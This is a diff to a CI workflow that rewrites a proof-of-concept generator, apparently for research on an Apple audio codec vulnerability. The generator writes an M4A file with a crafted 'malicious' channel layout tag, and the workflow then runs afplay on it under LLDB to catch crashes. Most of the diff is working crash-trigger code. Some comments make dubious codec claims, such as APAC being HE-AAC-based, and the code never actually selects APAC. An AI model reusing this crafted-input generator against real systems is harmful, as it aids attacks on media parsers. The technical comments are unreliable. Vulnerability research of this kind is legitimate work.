@@ -19,85 +19,73 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # Updated: Patch encodeme.mm to manually corrupt the channel layout.
-      - name: Patch encodeme.mm to corrupt the channel layout
+      # Updated: Patch encodeme.mm to generate a malicious APAC file.
+      - name: Patch encodeme.mm to generate malicious APAC file
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to generate and then corrupt the channel layout..."
+          echo "Patching encodeme.mm to generate a file with a malicious APAC channel layout..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #import <AudioToolbox/AudioToolbox.h>
           #include <string.h>
-
-          // Helper function to write a valid, short M4A file
-          bool createValidM4A(const char* path) {
-              NSString *fileName = [NSString stringWithUTF8String:path];
-              CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)fileName, kCFURLPOSIXPathStyle, false);
-
-              AudioStreamBasicDescription asbd = {0};
-              asbd.mSampleRate = 44100;
-              asbd.mFormatID = kAudioFormatMPEG4AAC;
-              asbd.mFramesPerPacket = 1024;
-              asbd.mChannelsPerFrame = 1;
-
-              AudioFileID audioFile;
-              OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
-              if (status != noErr) return false;
-
-              // Write a few packets of silent data
-              UInt32 numPacketsToWrite = 5;
-              UInt32 packetByteSize = 256;
-              char dummy_data[packetByteSize];
-              memset(dummy_data, 0, sizeof(dummy_data));
-              
-              for (UInt32 i = 0; i < numPacketsToWrite; ++i) {
-                  AudioStreamPacketDescription packetDesc = {0};
-                  packetDesc.mDataByteSize = packetByteSize;
-                  UInt32 packetsInThisWrite = 1;
-                  status = AudioFileWritePackets(audioFile, false, packetByteSize, &packetDesc, i, &packetsInThisWrite, dummy_data);
-                  if (status != noErr) break;
-              }
-              
-              AudioFileClose(audioFile);
-              CFRelease(fileURL);
-              return status == noErr;
-          }
 
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  const char* fileName = "output_channel_corruption.m4a";
+                  const char* fileName = "output_apac_poc.m4a";
+                  CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,
+                                                                   (CFStringRef)[NSString stringWithUTF8String:fileName],
+                                                                   kCFURLPOSIXPathStyle, false);
 
-                  // Step 1: Create a valid M4A file.
-                  if (!createValidM4A(fileName)) {
-                      fprintf(stderr, "Failed to create a valid base M4A file.\n");
+                  // Define the audio format for APAC (Apple Positional Audio Codec)
+                  AudioStreamBasicDescription asbd = {0};
+                  asbd.mSampleRate = 48000;
+                  asbd.mFormatID = kAudioFormatMPEG4AAC_HE; // APAC is often based on HE-AAC
+                  asbd.mFormatFlags = kAudioFormatFlagIsBigEndian; // Typical for APAC
+                  asbd.mFramesPerPacket = 1024;
+                  asbd.mChannelsPerFrame = 4; // HOA often uses 4+ channels
+
+                  // PoC: Create a malicious AudioChannelLayout
+                  // The vulnerability lies in the lower two bytes of mChannelLayoutTag,
+                  // which determines the size of mRemappingArray.
+                  // We'll use a large value to create an oversized array.
+                  AudioChannelLayout maliciousLayout = {0};
+                  maliciousLayout.mChannelLayoutTag = kAudioChannelLayoutTag_UseChannelDescriptions;
+                  
+                  // This is the core of the exploit: a custom layout tag that implies
+                  // a large number of channels, causing a mismatch later.
+                  // Let's set a tag that implies a large remapping array.
+                  maliciousLayout.mChannelLayoutTag = 0x010100FF; // Custom, malicious tag
+
+                  AudioFileID audioFile;
+                  OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
+                  if (status != noErr) {
+                      fprintf(stderr, "AudioFileCreateWithURL failed: %d\n", status);
                       return 1;
                   }
-                  fprintf(stderr, "Successfully created a valid M4A file.\n");
 
-                  // Step 2: Re-open the file and manually corrupt a header field.
-                  FILE *file = fopen(fileName, "r+b"); // Open for binary read/write
-                  if (!file) {
-                      fprintf(stderr, "Failed to re-open the M4A file for corruption.\n");
+                  // Set the malicious channel layout on the file. This is where the vulnerability is seeded.
+                  status = AudioFileSetProperty(audioFile, kAudioFilePropertyChannelLayout, sizeof(maliciousLayout), &maliciousLayout);
+                  if (status != noErr) {
+                      fprintf(stderr, "AudioFileSetProperty (ChannelLayout) failed: %d\n", status);
+                      AudioFileClose(audioFile);
                       return 1;
                   }
 
-                  // PoC: Manual Corruption of the Channel Layout
-                  // The 'stsd' atom contains the sample description, which includes the channel layout.
-                  // By corrupting the mChannelLayoutTag, we can try to trigger a crash in the
-                  // audio processing pipeline, not just the initial file parser.
-                  // This offset is an estimate for where the tag is located.
-                  fseek(file, 0x150, SEEK_SET);
-                  
-                  // This value (0xFFFFFFFF) is an invalid channel layout tag.
-                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
-                  
-                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
-                  fclose(file);
+                  // Write a small amount of dummy packet data to make the file valid enough to pass initial checks.
+                  UInt32 numPacketsToWrite = 1;
+                  char dummy_data[128] = {0};
+                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), NULL, 0, &numPacketsToWrite, dummy_data);
+                   if (status != noErr) {
+                      fprintf(stderr, "AudioFileWritePackets failed: %d\n", status);
+                  }
 
-                  fprintf(stderr, "PoC: Manually corrupted the 'mChannelLayoutTag' in the M4A file.\n");
+                  AudioFileClose(audioFile);
+                  CFRelease(fileURL);
+
+                  fprintf(stderr, "PoC: Wrote an APAC file with a malicious channel layout tag.\n");
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -124,15 +112,15 @@ jobs:
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           ./encodeme_debug
-          echo "File 'output_channel_corruption.m4a' generated."
-          ls -l output_channel_corruption.m4a
+          echo "File 'output_apac_poc.m4a' generated."
+          ls -l output_apac_poc.m4a
           
       # Launch the player directly under LLDB to catch any startup crashes
       - name: Launch Player Under LLDB to Catch Startup Crashes
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
           PLAYER_LOG_FILE="player_debug_log.txt"
-          echo "--- Debugging Audio Player (afplay) with corrupted channel layout ---" > $PLAYER_LOG_FILE
+          echo "--- Debugging Audio Player (afplay) with malicious APAC file ---" > $PLAYER_LOG_FILE
           echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
 
           echo "Creating LLDB script to launch and monitor afplay..."
@@ -145,9 +133,7 @@ jobs:
           EOF
 
           echo "Launching afplay under LLDB to detect any startup crash..." >> $PLAYER_LOG_FILE
-          # Execute afplay with the invalid file as an argument, under the control of the LLDB script.
-          # We add '|| true' because afplay might exit with an error, which we expect.
-          lldb -s player_debug_script.lldb -- afplay output_channel_corruption.m4a >> $PLAYER_LOG_FILE 2>&1 || true
+          lldb -s player_debug_script.lldb -- afplay output_apac_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true
 
           echo "✅ Player debug log created. Displaying contents:"
           cat $PLAYER_LOG_FILE
@@ -158,7 +144,7 @@ jobs:
         with:
           name: audio-and-debug-artifacts
           path: |
-            AppleTest/apple-positional-audio-codec-invalid-header-main/output_channel_corruption.m4a
+            AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_poc.m4a
             AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
